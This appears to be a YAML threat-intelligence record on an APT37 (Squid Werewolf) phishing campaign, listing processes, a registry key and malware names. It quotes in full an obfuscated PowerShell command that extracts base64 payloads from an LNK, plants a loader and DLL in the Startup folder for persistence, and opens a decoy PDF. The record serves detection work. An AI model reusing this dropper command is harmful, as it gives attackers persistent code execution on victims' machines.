description: "Squid Werewolf phishing campaign using a password\u2011protected ZIP\
  \ containing an LNK that launches PowerShell to drop and execute a .NET loader with\
  \ persistence via Startup folder."
attribution: Squid Werewolf (APT37, Ricochet Chollima, ScarCruft, Reaper Group)
malware_families:
- dfsvc.exe
- DomainManager.dll
TTPs:
  processes:
  - powershell.exe
  - explorer.exe
  - start.exe
  - d.exe
  commandline:
  - '''powershell.exe -nop -c $t=$env:appdata+''\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'';if(Get-ChildItem
    $env:temp -recurse ''  .pdf.lnk''){$k=New-Object IO.FileStream ($env:temp+''\\''+((Get-ChildItem
    $env:temp -recurse ''  .pdf.lnk'').Directory).Name+''\\''+''  .pdf.lnk''),''Open'',''Read'',''ReadWrite''}else{$k=New-Object
    IO.FileStream ''  .pdf.lnk'',''Open'',''Read'',''ReadWrite''};$b=New-Object byte[](692604);$k.Seek(3001,[IO.SeekOrigin]::Begin);$k.Read($b,0,692604);$a=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64CharArray($b,0,$b.Length))
    -split '':'';copy ''C:\Windows\Microsoft.NET\Framework\v4.0.30319\dfsvc.exe''
    ($t+''\\d.exe'');[IO.File]::<# mm #>WriteAllBytes($t+''\\d.exe.config'',[Convert]::FromBase64""String($a[0]));[IO.File]::<#
    mm #>WriteAllBytes($t+''\\DomainManager.dll'',[Convert]::FromBase64""String($a[1]));[IO.File]::<#
    mm #>WriteAllBytes($env:temp+''\\mngs Attachement.pdf'',[Convert]::FromBase64""String($a[2]));explorer
    ($env:temp+''\\mngs Attachement.pdf'');start ($t+''\\d.exe'')'''
  powershell:
  - $t=$env:appdata+'\Microsoft\Windows\Start Menu\Programs\Startup';if(Get-ChildItem
    $env:temp -recurse ' .pdf.lnk'){...}
  scripting_engine: []
  registry_keys:
  - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\StartupFolder
  image_load: []
  network_connections:
